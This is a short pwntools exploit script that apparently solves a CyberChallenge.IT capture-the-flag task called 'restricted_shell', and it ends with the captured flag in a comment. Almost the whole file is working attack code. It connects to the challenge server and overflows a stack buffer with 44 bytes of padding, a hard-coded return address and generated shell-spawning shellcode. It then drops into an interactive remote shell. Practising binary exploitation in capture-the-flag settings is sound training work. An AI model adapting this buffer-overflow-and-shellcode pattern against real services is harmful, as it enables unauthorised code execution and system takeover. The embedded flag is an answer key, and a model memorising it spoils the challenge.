from pwn import *

exe = ELF('restricted_shell')
context.binary = exe
HOST = "rshell.challs.cyberchallenge.it"
PORT = 6003
p = remote(HOST, PORT)

shell_code = asm(shellcraft.sh())  # Crafting shellcode
p.sendlineafter(b'c:\ >', b'a' * 44 + p32(0x8048593) + shell_code)  # address of the start of the stack plus shellcode
p.recvuntil('install')
p.recvuntil('\n\n')
p.interactive()

# FLAG --> CCIT{You f0unD Ur fir5T G4dge7. ROP is w41t1n9}
